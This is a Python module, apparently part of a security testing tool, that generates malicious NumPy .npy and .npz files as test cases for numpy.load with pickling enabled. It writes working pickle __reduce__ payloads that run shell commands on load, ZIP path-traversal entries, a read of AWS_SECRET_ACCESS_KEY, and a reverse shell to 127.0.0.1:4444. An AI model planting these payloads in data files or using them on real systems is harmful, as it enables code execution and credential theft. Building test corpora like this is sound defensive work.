"""NumPy malicious test case generator.

Generates NumPy archive files (.npz) containing exploit payloads
that target vulnerabilities in numpy.load().
"""

import io
import os
import pickle
import zipfile
from typing import List, Optional

from .base_generator import BaseTestCaseGenerator, GeneratedTestCase


class NumpyTestCaseGenerator(BaseTestCaseGenerator):
    """Generates malicious NumPy test case files.
    
    Creates NPZ archives with exploit payloads that execute
    when loaded via numpy.load() with allow_pickle=True.
    
    Vulnerability types:
    - Pickle code execution in .npy files
    - Path traversal in .npz archives
    - Malicious object arrays
    """
    
    VULN_TYPES = [
        "pickle_rce",
        "path_traversal",
        "object_array_rce",
        "subprocess_spawn",
        "env_exfiltration",
        "reverse_shell",
    ]
    
    def get_format_name(self) -> str:
        return "numpy"
    
    def get_format_extensions(self) -> List[str]:
        return [".npy", ".npz"]
    
    def get_vulnerability_types(self) -> List[str]:
        return self.VULN_TYPES.copy()
    
    def generate_all(self, output_dir: str) -> List[GeneratedTestCase]:
        """Generate all NumPy exploit test cases."""
        self._ensure_output_dir(output_dir)
        results = []
        
        for vuln_type in self.VULN_TYPES:
            try:
                tc = self.generate_specific(vuln_type, output_dir)
                if tc:
                    results.append(tc)
            except Exception as e:
                print(f"  [!] Failed to generate {vuln_type}: {e}")
        
        return results
    
    def generate_specific(self, vuln_type: str, output_dir: str) -> Optional[GeneratedTestCase]:
        """Generate a specific NumPy vulnerability test case."""
        self._ensure_output_dir(output_dir)
        
        generators = {
            "pickle_rce": self._gen_pickle_rce,
            "path_traversal": self._gen_path_traversal,
            "object_array_rce": self._gen_object_array,
            "subprocess_spawn": self._gen_subprocess,
            "env_exfiltration": self._gen_env_exfil,
            "reverse_shell": self._gen_reverse_shell,
        }
        
        if vuln_type not in generators:
            return None
        
        return generators[vuln_type](output_dir)
    
    def _create_npy_header(self, shape: tuple, dtype: str = '<f8') -> bytes:
        """Create a minimal NPY file header."""
        # NPY format magic + version
        header = b'\x93NUMPY\x01\x00'
        
        # Header dict
        header_dict = f"{{'descr': '{dtype}', 'fortran_order': False, 'shape': {shape}, }}"
        header_dict = header_dict.encode('latin1')
        
        # Pad to 64-byte alignment
        pad_len = 64 - (len(header) + 2 + len(header_dict)) % 64
        header_dict = header_dict + b' ' * pad_len + b'\n'
        
        # Header length
        header += len(header_dict).to_bytes(2, 'little')
        header += header_dict
        
        return header
    
    def _create_malicious_npy(self, payload_class) -> bytes:
        """Create a malicious NPY file with pickled object."""
        # NPY with object dtype contains pickle data
        header = b'\x93NUMPY\x01\x00'
        
        # Header for object array
        header_dict = b"{'descr': '|O', 'fortran_order': False, 'shape': (1,), }"
        pad_len = 64 - (len(header) + 2 + len(header_dict)) % 64
        header_dict = header_dict + b' ' * pad_len + b'\n'
        header += len(header_dict).to_bytes(2, 'little')
        header += header_dict
        
        # Pickle the malicious object
        pickle_data = pickle.dumps(payload_class())
        
        return header + pickle_data
    
    def _gen_pickle_rce(self, output_dir: str) -> GeneratedTestCase:
        """Generate pickle-based RCE in NPY file."""
        filename = "exploit_pickle_rce.npy"
        filepath = os.path.join(output_dir, filename)
        
        class MaliciousPickle:
            def __reduce__(self):
                import os
                return (os.system, ('id',))
        
        npy_data = self._create_malicious_npy(MaliciousPickle)
        
        with open(filepath, "wb") as f:
            f.write(npy_data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Pickle RCE in NPY",
            target_parser="numpy.load(allow_pickle=True)",
            cve_id=None,
            description="Object array in NPY file contains pickle RCE payload",
            severity="critical",
        )
    
    def _gen_path_traversal(self, output_dir: str) -> GeneratedTestCase:
        """Generate path traversal in NPZ archive."""
        filename = "exploit_path_traversal.npz"
        filepath = os.path.join(output_dir, filename)
        
        # NPZ is just a ZIP with .npy files inside
        with zipfile.ZipFile(filepath, "w") as zf:
            # Normal array entry
            zf.writestr("arr_0.npy", self._create_npy_header((10,)) + b'\x00' * 80)
            # Path traversal entries
            zf.writestr("../../../tmp/pwned.npy", b"pwned")
            zf.writestr("../../etc/pwned.txt", b"traversal successful")
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Path Traversal in NPZ",
            target_parser="numpy.load() / ZIP extraction",
            cve_id=None,
            description="NPZ archive contains path traversal entries",
            severity="high",
        )
    
    def _gen_object_array(self, output_dir: str) -> GeneratedTestCase:
        """Generate malicious object array."""
        filename = "exploit_object_array.npz"
        filepath = os.path.join(output_dir, filename)
        
        class ObjectRCE:
            def __reduce__(self):
                import os
                return (os.system, ('echo "Object array RCE"',))
        
        npy_data = self._create_malicious_npy(ObjectRCE)
        
        with zipfile.ZipFile(filepath, "w") as zf:
            zf.writestr("malicious_array.npy", npy_data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Object Array RCE",
            target_parser="numpy.load(allow_pickle=True)",
            cve_id=None,
            description="NPZ contains object array with malicious __reduce__",
            severity="critical",
        )
    
    def _gen_subprocess(self, output_dir: str) -> GeneratedTestCase:
        """Generate subprocess spawn payload."""
        filename = "exploit_subprocess.npy"
        filepath = os.path.join(output_dir, filename)
        
        class SubprocessSpawn:
            def __reduce__(self):
                import subprocess
                return (subprocess.Popen, (['id'],))
        
        npy_data = self._create_malicious_npy(SubprocessSpawn)
        
        with open(filepath, "wb") as f:
            f.write(npy_data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Subprocess Spawn",
            target_parser="numpy.load(allow_pickle=True)",
            cve_id=None,
            description="NPY file spawns subprocess when loaded",
            severity="critical",
        )
    
    def _gen_env_exfil(self, output_dir: str) -> GeneratedTestCase:
        """Generate environment exfiltration payload."""
        filename = "exploit_env_exfiltration.npy"
        filepath = os.path.join(output_dir, filename)
        
        class EnvExfil:
            def __reduce__(self):
                import os
                # Use os.getenv instead of os.environ to avoid pickling issues
                return (os.getenv, ('AWS_SECRET_ACCESS_KEY',))
        
        npy_data = self._create_malicious_npy(EnvExfil)
        
        with open(filepath, "wb") as f:
            f.write(npy_data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Environment Exfiltration",
            target_parser="numpy.load(allow_pickle=True)",
            cve_id=None,
            description="NPY file exfiltrates environment variables when loaded",
            severity="high",
        )
    
    def _gen_reverse_shell(self, output_dir: str) -> GeneratedTestCase:
        """Generate reverse shell payload."""
        filename = "exploit_reverse_shell.npy"
        filepath = os.path.join(output_dir, filename)
        
        class ReverseShell:
            def __reduce__(self):
                import os
                cmd = (
                    "python -c \"import socket,subprocess,os;"
                    "s=socket.socket();"
                    "s.connect(('127.0.0.1',4444));"
                    "os.dup2(s.fileno(),0);"
                    "os.dup2(s.fileno(),1);"
                    "os.dup2(s.fileno(),2);"
                    "subprocess.call(['/bin/sh','-i'])\""
                )
                return (os.system, (cmd,))
        
        npy_data = self._create_malicious_npy(ReverseShell)
        
        with open(filepath, "wb") as f:
            f.write(npy_data)
        
        return self._create_testcase(
            filename=filename,
            filepath=filepath,
            vuln_type="Reverse Shell",
            target_parser="numpy.load(allow_pickle=True)",
            cve_id=None,
            description="NPY file spawns reverse shell when loaded",
            severity="critical",
        )
